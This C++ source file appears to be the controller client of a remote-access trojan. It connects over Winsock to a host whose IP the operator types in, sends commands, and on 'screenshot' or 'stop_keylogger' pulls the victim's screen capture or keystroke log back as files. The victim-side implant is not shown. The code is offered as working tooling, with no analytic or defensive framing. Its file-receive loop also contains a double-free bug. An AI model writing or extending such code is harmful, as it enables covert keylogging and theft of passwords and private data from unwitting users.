#include "socket.h"
#include "gmail.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_PORT "12345"
#define DEFAULT_BUFLEN 1024

void startClient()
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	int iResult;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		std::cerr << "WSAStartup failed with error: " << iResult << std::endl;
		return;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	while (ConnectSocket == INVALID_SOCKET)
	{
		// Get server address from user input
		std::string addr;
		std::cout << "Enter server IP address: ";
		std::getline(std::cin, addr);
		const char* serverAddress = addr.c_str();

		try {
			// Resolve the server address and port
			iResult = getaddrinfo(serverAddress, DEFAULT_PORT, &hints, &result);
			if (iResult != 0)
			{
				std::cerr << "getaddrinfo failed with error: " << iResult << std::endl;
				WSACleanup();
				return;
			}

			// Attempt to connect to the first result
			for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
			{
				// Create a socket for connecting to server
				ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
				if (ConnectSocket == INVALID_SOCKET)
				{
					std::cerr << "Socket failed with error: " << WSAGetLastError() << std::endl;
					WSACleanup();
					return;
				}

				// Connect to server
				iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
				if (iResult == SOCKET_ERROR)
				{
					closesocket(ConnectSocket);
					ConnectSocket = INVALID_SOCKET;
					continue;
				}
				break;
			}
		}
		catch (const std::exception& e) {
			std::cerr << e.what() << std::endl;
		}

		freeaddrinfo(result);

		if (ConnectSocket == INVALID_SOCKET)
		{
			std::cerr << "Unable to connect to server!" << std::endl;
		}
		else
		{
			std::cout << "Connected to server!" << std::endl;
		}
	}

	//------------------------------------
	// Change the code here
	// Chat loop
	std::string request;
	while (1)
	{
		// Get client's message
		std::cout << "Client: ";
		std::getline(std::cin, request);

		iResult = send(ConnectSocket, request.c_str(), request.size(), 0);
		if (iResult == SOCKET_ERROR)
		{
			std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
			break;
		}

		if (request == "exit")
		{
			std::cout << "Client is exiting..." << std::endl;
			break;
		}
		// Receive response from server
		if (request == "screenshot" || request == "stop_keylogger") {
			// Receive file size first
			int fileSize;
			iResult = recv(ConnectSocket, (char*)&fileSize, sizeof(fileSize), 0);
			if (iResult == SOCKET_ERROR) {
				std::cerr << "Recv failed with error: " << WSAGetLastError() << std::endl;
				break;
			}

			std::cout << "Expecting a file of size: " << fileSize << " bytes." << std::endl;

			// Allocate buffer for receiving the file
			char* fileBuffer = new char[fileSize];
			int bytesReceived = 0;
			int totalReceived = 0;

			while (totalReceived < fileSize) {
				bytesReceived = recv(ConnectSocket, fileBuffer + totalReceived, fileSize - totalReceived, 0);
				if (bytesReceived == SOCKET_ERROR) {
					std::cerr << "Recv failed with error: " << WSAGetLastError() << std::endl;
					delete[] fileBuffer;
					break;
				}
				totalReceived += bytesReceived;
			}

			std::string filename = request == "screenshot" ? "screenshot.png" : "keylog.txt";

			// Save the received data to a file
			std::ofstream outFile(filename, std::ios::binary);
			outFile.write(fileBuffer, totalReceived);
			outFile.close();

			std::cout << "File received successfully!" << std::endl;

			delete[] fileBuffer;
		}
		else {
			int responseSize;
			iResult = recv(ConnectSocket, (char*)&responseSize, sizeof(responseSize), 0);
			if (iResult > 0)
			{
				// Allocate buffer for receiving the response
				char* responseBuffer = new char[responseSize];
				int bytesReceived = 0;
				int totalReceived = 0;

				while (totalReceived < responseSize)
				{
					bytesReceived = recv(ConnectSocket, responseBuffer + totalReceived, responseSize - totalReceived, 0);
					if (bytesReceived == SOCKET_ERROR)
					{
						std::cerr << "Recv failed with error: " << WSAGetLastError() << std::endl;
						delete[] responseBuffer;
						break;
					}
					totalReceived += bytesReceived;
				}

				std::cout << "Server: " << std::string(responseBuffer, totalReceived) << std::endl;
			}
			else if (iResult == 0)
			{
				std::cout << "Connection closed by server.\n";
				break;
			}
			else
			{
				std::cerr << "Recv failed with error: " << WSAGetLastError() << std::endl;
				break;
			}
		}
	}
	//--------------------------------------

	// Cleanup
	closesocket(ConnectSocket);
	WSACleanup();
}